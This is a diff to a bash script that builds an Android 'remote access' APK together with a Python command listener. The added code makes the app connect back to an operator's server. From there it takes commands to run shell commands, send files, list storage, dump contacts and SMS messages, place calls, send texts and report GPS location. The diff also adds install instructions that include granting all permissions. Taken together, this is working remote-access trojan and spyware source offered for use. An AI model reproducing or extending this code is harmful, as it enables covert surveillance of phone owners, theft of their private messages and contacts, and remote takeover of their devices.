@@ -36,6 +36,9 @@ check_java_version() {
             sudo apt install -y openjdk-17-jdk
             export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64
             export PATH=$JAVA_HOME/bin:$PATH
+            echo -e "${GREEN}✓ Now using Java 17${NC}"
+        else
+            echo -e "${GREEN}✓ Java version $JAVA_VERSION is compatible${NC}"
         fi
     else
         echo -e "${YELLOW}Installing Java 17...${NC}"
@@ -57,12 +60,11 @@ check_requirements() {
         apksigner \
         python3 \
         python3-pip \
-        python3-tk \
-        gradle
+        python3-tk
     
     pip3 install --user opencv-python numpy pillow
     
-    # Setup Android SDK
+    # Download and setup Android SDK
     if [ ! -d "$HOME/Android/Sdk" ]; then
         mkdir -p $HOME/Android/Sdk
         cd $HOME/Android/Sdk
@@ -77,7 +79,10 @@ check_requirements() {
     export ANDROID_HOME=$HOME/Android/Sdk
     export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools
     
+    # Accept licenses
     yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null 2>&1
+    
+    # Install SDK components
     $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"
     
     echo -e "${GREEN}✓ Requirements installed${NC}"
@@ -278,7 +283,7 @@ public class MainActivity extends Activity {
 }
 EOF
 
-    # Remote Service (simplified for brevity - use the same as before but I'll keep it shorter here)
+    # Remote Service with full features
     cat > app/src/main/java/com/remote/access/RemoteService.java << EOF
 package com.remote.access;
 
@@ -295,7 +300,6 @@ import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
 import android.os.IBinder;
 import android.os.Handler;
-import android.os.HandlerThread;
 import android.util.Log;
 import android.view.Display;
 import android.view.WindowManager;
@@ -303,6 +307,15 @@ import java.io.*;
 import java.net.*;
 import java.nio.ByteBuffer;
 import android.os.PowerManager;
+import android.location.Location;
+import android.location.LocationManager;
+import android.location.LocationListener;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.database.Cursor;
+import android.net.Uri;
+import android.provider.ContactsContract;
+import android.provider.Telephony;
 
 public class RemoteService extends Service {
     private static final String TAG = "RemoteService";
@@ -313,6 +326,7 @@ public class RemoteService extends Service {
     private Socket socket;
     private PrintWriter out;
     private DataOutputStream dataOut;
+    private BufferedReader in;
     private PowerManager.WakeLock wakeLock;
     
     private MediaProjection mMediaProjection;
@@ -415,32 +429,220 @@ public class RemoteService extends Service {
                 socket = new Socket(SERVER_IP, SERVER_PORT);
                 out = new PrintWriter(socket.getOutputStream(), true);
                 dataOut = new DataOutputStream(socket.getOutputStream());
-                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                 
+                // Send device info
                 out.println("DEVICE_INFO:" + android.os.Build.MANUFACTURER + "|" + 
                            android.os.Build.MODEL + "|" + android.os.Build.VERSION.RELEASE);
                 
                 String command;
                 while (isRunning && (command = in.readLine()) != null) {
-                    if (command.equals("START_STREAM")) {
-                        startScreenStream();
-                        out.println("STREAM_STARTED");
-                    } else if (command.equals("STOP_STREAM")) {
-                        isStreaming = false;
-                        out.println("STREAM_STOPPED");
-                    } else if (command.equals("PING")) {
-                        out.println("PONG");
-                    } else if (command.equals("EXIT")) {
-                        isRunning = false;
-                        stopSelf();
-                    }
+                    handleCommand(command);
                 }
+                
             } catch (Exception e) {
                 Log.e(TAG, "Connection error", e);
                 try { Thread.sleep(5000); } catch (Exception ignored) {}
             } finally {
                 try { if (socket != null) socket.close(); } catch (Exception ignored) {}
             }
+        }
+    }
+    
+    private void handleCommand(String command) {
+        Log.d(TAG, "Command: " + command);
+        
+        if (command.equals("START_STREAM")) {
+            if (!isStreaming) {
+                startScreenStream();
+                out.println("STREAM_STARTED");
+            }
+        }
+        else if (command.equals("STOP_STREAM")) {
+            isStreaming = false;
+            out.println("STREAM_STOPPED");
+        }
+        else if (command.startsWith("SHELL:")) {
+            executeShellCommand(command.substring(6));
+        }
+        else if (command.startsWith("GET_FILE:")) {
+            sendFile(command.substring(9));
+        }
+        else if (command.equals("LIST_FILES")) {
+            listFiles("/storage/emulated/0");
+        }
+        else if (command.startsWith("LIST_FILES:")) {
+            listFiles(command.substring(11));
+        }
+        else if (command.equals("GET_CONTACTS")) {
+            getContacts();
+        }
+        else if (command.equals("GET_SMS")) {
+            getSMS();
+        }
+        else if (command.startsWith("CALL:")) {
+            makeCall(command.substring(5));
+        }
+        else if (command.startsWith("SMS:")) {
+            String[] parts = command.substring(4).split("\\|");
+            if (parts.length == 2) {
+                sendSMS(parts[0], parts[1]);
+            }
+        }
+        else if (command.equals("GET_LOCATION")) {
+            getLocation();
+        }
+        else if (command.equals("PING")) {
+            out.println("PONG");
+        }
+        else if (command.equals("EXIT")) {
+            isRunning = false;
+            stopSelf();
+        }
+    }
+    
+    private void executeShellCommand(String cmd) {
+        try {
+            Process process = Runtime.getRuntime().exec(cmd);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String line;
+            while ((line = reader.readLine()) != null) {
+                out.println("SHELL_OUT:" + line);
+            }
+            out.println("SHELL_DONE");
+        } catch (Exception e) {
+            out.println("SHELL_ERROR:" + e.getMessage());
+        }
+    }
+    
+    private void sendFile(String path) {
+        try {
+            File file = new File(path);
+            if (!file.exists()) {
+                out.println("FILE_ERROR:File not found");
+                return;
+            }
+            
+            out.println("FILE_SIZE:" + file.length());
+            FileInputStream fis = new FileInputStream(file);
+            OutputStream os = socket.getOutputStream();
+            
+            byte[] buffer = new byte[8192];
+            int bytesRead;
+            while ((bytesRead = fis.read(buffer)) != -1) {
+                os.write(buffer, 0, bytesRead);
+            }
+            fis.close();
+        } catch (Exception e) {
+            out.println("FILE_ERROR:" + e.getMessage());
+        }
+    }
+    
+    private void listFiles(String dir) {
+        try {
+            File directory = new File(dir);
+            File[] files = directory.listFiles();
+            if (files != null) {
+                for (File file : files) {
+                    out.println("FILE_ENTRY:" + file.getAbsolutePath() + "|" + 
+                               (file.isDirectory() ? "DIR" : "FILE") + "|" + 
+                               file.length());
+                }
+            }
+            out.println("LIST_DONE");
+        } catch (Exception e) {
+            out.println("LIST_ERROR:" + e.getMessage());
+        }
+    }
+    
+    private void getContacts() {
+        try {
+            Cursor phones = getContentResolver().query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
+                null, null, null, null);
+            
+            while (phones != null && phones.moveToNext()) {
+                String name = phones.getString(
+                    phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                String phoneNumber = phones.getString(
+                    phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                out.println("CONTACT:" + name + "|" + phoneNumber);
+            }
+            if (phones != null) phones.close();
+            out.println("CONTACTS_DONE");
+        } catch (Exception e) {
+            out.println("CONTACTS_ERROR:" + e.getMessage());
+        }
+    }
+    
+    private void getSMS() {
+        try {
+            Cursor cursor = getContentResolver().query(
+                Telephony.Sms.CONTENT_URI, null, null, null, null);
+            
+            while (cursor != null && cursor.moveToNext()) {
+                String address = cursor.getString(
+                    cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                String body = cursor.getString(
+                    cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
+                String date = cursor.getString(
+                    cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
+                out.println("SMS_ENTRY:" + address + "|" + date + "|" + body);
+            }
+            if (cursor != null) cursor.close();
+            out.println("SMS_DONE");
+        } catch (Exception e) {
+            out.println("SMS_ERROR:" + e.getMessage());
+        }
+    }
+    
+    private void makeCall(String number) {
+        try {
+            Intent intent = new Intent(Intent.ACTION_CALL);
+            intent.setData(Uri.parse("tel:" + number));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+            out.println("CALL_INITIATED:" + number);
+        } catch (Exception e) {
+            out.println("CALL_ERROR:" + e.getMessage());
+        }
+    }
+    
+    private void sendSMS(String number, String message) {
+        try {
+            SmsManager smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage(number, null, message, null, null);
+            out.println("SMS_SENT:" + number);
+        } catch (Exception e) {
+            out.println("SMS_ERROR:" + e.getMessage());
+        }
+    }
+    
+    private void getLocation() {
+        try {
+            LocationManager locationManager = (LocationManager) 
+                getSystemService(Context.LOCATION_SERVICE);
+            
+            LocationListener locationListener = new LocationListener() {
+                @Override
+                public void onLocationChanged(Location location) {
+                    out.println("LOCATION:" + 
+                        location.getLatitude() + "|" + 
+                        location.getLongitude() + "|" + 
+                        location.getAccuracy());
+                }
+                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
+                @Override public void onProviderEnabled(String provider) {}
+                @Override public void onProviderDisabled(String provider) {}
+            };
+            
+            locationManager.requestSingleUpdate(
+                LocationManager.GPS_PROVIDER, 
+                locationListener, 
+                null);
+            
+        } catch (Exception e) {
+            out.println("LOCATION_ERROR:" + e.getMessage());
         }
     }
     
@@ -510,20 +712,43 @@ EOF
     echo -e "${GREEN}✓ Java code created${NC}"
 }
 
-# Build the APK using gradle command directly
+# FIXED: Build the APK using downloaded Gradle 8.4
 build_apk() {
-    echo -e "${YELLOW}[5/8] Building APK...${NC}"
+    echo -e "${YELLOW}[5/8] Building APK with Gradle 8.4...${NC}"
     
     cd $PROJECT_DIR
     
-    # Use gradle command directly instead of wrapper
-    gradle assembleRelease
+    # Download Gradle 8.4 if not present
+    if [ ! -d "$HOME/gradle-8.4" ]; then
+        echo "Downloading Gradle 8.4..."
+        cd $HOME
+        wget -q https://services.gradle.org/distributions/gradle-8.4-bin.zip
+        unzip -q gradle-8.4-bin.zip
+        rm gradle-8.4-bin.zip
+        echo -e "${GREEN}✓ Gradle 8.4 downloaded${NC}"
+    fi
     
+    # Use Gradle 8.4 directly
+    export PATH="$HOME/gradle-8.4/bin:$PATH"
+    
+    # Verify Gradle version
+    gradle --version | head -n 2
+    
+    # Build the APK
+    echo "Running gradle assembleRelease..."
+    gradle assembleRelease --no-daemon
+    
+    # Check if build succeeded
     if [ -f "app/build/outputs/apk/release/app-release.apk" ]; then
         cp app/build/outputs/apk/release/app-release.apk "$HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
         echo -e "${GREEN}✓ APK built successfully${NC}"
+        echo "APK saved to: $HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
     else
         echo -e "${RED}Failed to build APK${NC}"
+        echo "Checking for error logs..."
+        if [ -f "app/build/outputs/logs/manifest-merger-release-report.txt" ]; then
+            cat "app/build/outputs/logs/manifest-merger-release-report.txt"
+        fi
         exit 1
     fi
 }
@@ -545,7 +770,7 @@ sign_apk() {
 
 # Create listener script
 create_listener() {
-    echo -e "${YELLOW}[7/8] Creating listener...${NC}"
+    echo -e "${YELLOW}[7/8] Creating listener with full command support...${NC}"
     
     cat > ~/android-listener.py << EOF
 #!/usr/bin/env python3
@@ -557,6 +782,7 @@ import struct
 import tkinter as tk
 from PIL import Image, ImageTk
 import queue
+import os
 
 LISTENER_IP = "$LISTENER_IP"
 LISTENER_PORT = $LISTENER_PORT
@@ -574,13 +800,18 @@ class ScreenViewer:
     def update(self):
         try:
             img = self.image_queue.get_nowait()
-            img_resized = cv2.resize(img, (self.root.winfo_width(), self.root.winfo_height()))
-            img_rgb = cv2.cvtColor(img_resized, cv2.COLOR_BGR2RGB)
-            img_pil = Image.fromarray(img_rgb)
-            img_tk = ImageTk.PhotoImage(img_pil)
-            self.canvas.delete("all")
-            self.canvas.create_image(0, 0, anchor=tk.NW, image=img_tk)
-            self.canvas.image = img_tk
+            if img is not None:
+                # Resize to fit window
+                window_width = self.root.winfo_width()
+                window_height = self.root.winfo_height()
+                if window_width > 1 and window_height > 1:
+                    img_resized = cv2.resize(img, (window_width, window_height))
+                    img_rgb = cv2.cvtColor(img_resized, cv2.COLOR_BGR2RGB)
+                    img_pil = Image.fromarray(img_rgb)
+                    img_tk = ImageTk.PhotoImage(img_pil)
+                    self.canvas.delete("all")
+                    self.canvas.create_image(0, 0, anchor=tk.NW, image=img_tk)
+                    self.canvas.image = img_tk
         except queue.Empty:
             pass
         self.root.after(50, self.update)
@@ -598,92 +829,255 @@ class RemoteClient:
     
     def handle(self):
         print(f"\n[+] Connected to {self.addr}")
-        data = self.conn.recv(1024).decode().strip()
-        if data.startswith("DEVICE_INFO:"):
-            print(f"[Device] {data[12:]}")
         
-        threading.Thread(target=self.command_loop).start()
+        # Get device info
+        try:
+            data = self.conn.recv(1024).decode().strip()
+            if data.startswith("DEVICE_INFO:"):
+                info = data[12:]
+                print(f"[Device] {info}")
+        except:
+            pass
         
+        # Start command thread
+        cmd_thread = threading.Thread(target=self.command_loop)
+        cmd_thread.daemon = True
+        cmd_thread.start()
+        
+        # Handle incoming data
         while self.running:
             try:
                 if self.streaming:
+                    # Read image size
                     size_data = self.conn.recv(4)
-                    if not size_data: continue
+                    if not size_data or len(size_data) < 4:
+                        continue
                     img_size = struct.unpack('!I', size_data)[0]
                     
+                    # Read image data
                     img_data = b''
                     remaining = img_size
                     while remaining > 0:
                         chunk = self.conn.recv(min(8192, remaining))
+                        if not chunk:
+                            break
                         img_data += chunk
                         remaining -= len(chunk)
                     
+                    # Decode and display image
                     img = cv2.imdecode(np.frombuffer(img_data, np.uint8), cv2.IMREAD_COLOR)
                     if img is not None and self.viewer:
                         self.viewer.image_queue.put(img)
-            except: break
+                else:
+                    # Handle other data (file transfers, command output)
+                    self.conn.settimeout(0.1)
+                    try:
+                        data = self.conn.recv(1024).decode().strip()
+                        if data:
+                            print(data)
+                    except socket.timeout:
+                        pass
+                    self.conn.settimeout(None)
+            except Exception as e:
+                if self.running:
+                    print(f"Error: {e}")
+                break
         
         self.conn.close()
-        print(f"[-] Disconnected")
+        print(f"[-] Disconnected from {self.addr}")
     
     def command_loop(self):
         while self.running:
-            cmd = input(f"\033[92m{self.addr[0]}>\033[0m ")
-            
-            if cmd == "stream":
-                self.conn.send(b"START_STREAM\n")
-                self.streaming = True
-                self.viewer = ScreenViewer()
-                threading.Thread(target=self.viewer.show).start()
-                print("[*] Streaming started")
-            elif cmd == "stop":
-                self.conn.send(b"STOP_STREAM\n")
-                self.streaming = False
-                if self.viewer: self.viewer.root.quit()
-            elif cmd == "exit":
-                self.conn.send(b"EXIT\n")
-                self.running = False
+            try:
+                cmd = input(f"\033[92m{self.addr[0]}>\033[0m ")
+                
+                if cmd == "help":
+                    print("""
+Commands:
+  stream              - Start screen streaming
+  stop                - Stop screen streaming
+  shell <command>     - Execute shell command
+  get <file>          - Download file
+  ls [path]           - List directory
+  contacts            - Get contacts
+  sms                 - Get SMS messages
+  call <number>       - Make phone call
+  send <num> <msg>    - Send SMS
+  location            - Get GPS location
+  ping                - Test connection
+  exit                - Disconnect
+                    """)
+                
+                elif cmd == "stream":
+                    self.conn.send(b"START_STREAM\n")
+                    self.streaming = True
+                    self.viewer = ScreenViewer()
+                    viewer_thread = threading.Thread(target=self.viewer.show)
+                    viewer_thread.daemon = True
+                    viewer_thread.start()
+                    print("[*] Screen streaming started")
+                
+                elif cmd == "stop":
+                    self.conn.send(b"STOP_STREAM\n")
+                    self.streaming = False
+                    if self.viewer:
+                        self.viewer.root.quit()
+                    print("[*] Screen streaming stopped")
+                
+                elif cmd.startswith("shell "):
+                    self.conn.send(f"SHELL:{cmd[6:]}\n".encode())
+                
+                elif cmd.startswith("get "):
+                    self.conn.send(f"GET_FILE:{cmd[4:]}\n".encode())
+                    self.receive_file()
+                
+                elif cmd == "ls":
+                    self.conn.send(b"LIST_FILES\n")
+                
+                elif cmd.startswith("ls "):
+                    self.conn.send(f"LIST_FILES:{cmd[3:]}\n".encode())
+                
+                elif cmd == "contacts":
+                    self.conn.send(b"GET_CONTACTS\n")
+                
+                elif cmd == "sms":
+                    self.conn.send(b"GET_SMS\n")
+                
+                elif cmd.startswith("call "):
+                    self.conn.send(f"CALL:{cmd[5:]}\n".encode())
+                
+                elif cmd.startswith("send "):
+                    parts = cmd.split()
+                    if len(parts) >= 3:
+                        num = parts[1]
+                        msg = ' '.join(parts[2:])
+                        self.conn.send(f"SMS:{num}|{msg}\n".encode())
+                
+                elif cmd == "location":
+                    self.conn.send(b"GET_LOCATION\n")
+                
+                elif cmd == "ping":
+                    self.conn.send(b"PING\n")
+                
+                elif cmd == "exit":
+                    self.conn.send(b"EXIT\n")
+                    self.running = False
+                    break
+                
+                else:
+                    print("Unknown command. Type 'help'")
+                    
+            except Exception as e:
+                print(f"Command error: {e}")
                 break
+    
+    def receive_file(self):
+        try:
+            data = self.conn.recv(1024).decode().strip()
+            if data.startswith("FILE_SIZE:"):
+                size = int(data[10:])
+                filename = input("Save as: ")
+                
+                with open(filename, 'wb') as f:
+                    remaining = size
+                    while remaining > 0:
+                        data = self.conn.recv(min(8192, remaining))
+                        f.write(data)
+                        remaining -= len(data)
+                print(f"✅ File saved as {filename}")
+        except Exception as e:
+            print(f"File receive error: {e}")
 
 def start_server():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind((LISTENER_IP, LISTENER_PORT))
     server.listen(5)
-    print(f"\nListening on {LISTENER_IP}:{LISTENER_PORT}\n")
+    
+    print(f"\033[92m")
+    print("╔════════════════════════════════════════════╗")
+    print("║    Android Remote Access Listener         ║")
+    print("║    with Screen Streaming & Full Control   ║")
+    print("╚════════════════════════════════════════════╝")
+    print(f"\033[0m")
+    print(f"Listening on {LISTENER_IP}:{LISTENER_PORT}")
+    print("Waiting for connections...\n")
     
     while True:
         conn, addr = server.accept()
-        RemoteClient(conn, addr).handle()
+        client = RemoteClient(conn, addr)
+        thread = threading.Thread(target=client.handle)
+        thread.daemon = True
+        thread.start()
 
 if __name__ == "__main__":
     start_server()
 EOF
 
     chmod +x ~/android-listener.py
-    echo -e "${GREEN}✓ Listener created${NC}"
+    echo -e "${GREEN}✓ Listener created at ~/android-listener.py${NC}"
 }
 
 # Show instructions
 show_instructions() {
+    APK_PATH="$HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
+    
     clear
     echo -e "${GREEN}"
-    echo "╔════════════════════════════════════════════╗"
-    echo "║              SETUP COMPLETE!               ║"
-    echo "╚════════════════════════════════════════════╝"
+    echo "╔════════════════════════════════════════════════════════╗"
+    echo "║              SETUP COMPLETE!                           ║"
+    echo "╚════════════════════════════════════════════════════════╝"
     echo -e "${NC}"
-    echo -e "${YELLOW}APK:${NC} $HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
-    echo -e "${YELLOW}Listener:${NC} python3 ~/android-listener.py"
+    
+    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${YELLOW}APK File:${NC}"
+    echo "  $APK_PATH"
+    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    echo -e "\n${GREEN}INSTALLATION:${NC}"
+    echo "1. Transfer APK to Android device:"
+    echo "   • adb install $APK_PATH"
+    echo "   • python3 -m http.server 8000 (then download from http://$LISTENER_IP:8000)"
+    echo "   • Upload to cloud storage"
     echo ""
-    echo "Commands: stream - Start screen viewing"
-    echo "          stop   - Stop streaming"
-    echo "          exit   - Disconnect"
+    echo "2. On Android device:"
+    echo "   • Install the APK"
+    echo "   • Open the app once"
+    echo "   • Grant screen capture permission"
+    echo "   • Grant all other permissions"
+    echo ""
+    echo -e "${GREEN}START LISTENER:${NC}"
+    echo "  python3 ~/android-listener.py"
+    echo ""
+    echo -e "${YELLOW}AVAILABLE COMMANDS:${NC}"
+    echo "  stream     - Start real-time screen viewing"
+    echo "  stop       - Stop screen streaming"
+    echo "  shell <cmd>- Execute shell command"
+    echo "  get <file> - Download file"
+    echo "  ls [path]  - List directory"
+    echo "  contacts   - Get contacts"
+    echo "  sms        - Get SMS messages"
+    echo "  call <num> - Make phone call"
+    echo "  send <num> <msg> - Send SMS"
+    echo "  location   - Get GPS location"
+    echo "  ping       - Test connection"
+    echo "  exit       - Disconnect"
+    echo ""
+    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
 }
 
-# Main
+# Main execution
 main() {
     clear
-    echo -e "${BLUE}Android Remote Access APK Generator${NC}\n"
+    echo -e "${BLUE}"
+    echo "╔════════════════════════════════════════════╗"
+    echo "║  Android Remote Access with Screen Stream  ║"
+    echo "║        Creates streaming APK               ║"
+    echo "╚════════════════════════════════════════════╝"
+    echo -e "${NC}"
+    echo "Listener IP: $LISTENER_IP"
+    echo "Listener Port: $LISTENER_PORT"
+    echo ""
     
     check_java_version
     check_requirements
@@ -696,4 +1090,5 @@ main() {
     show_instructions
 }
 
+# Run main
 main "$@"
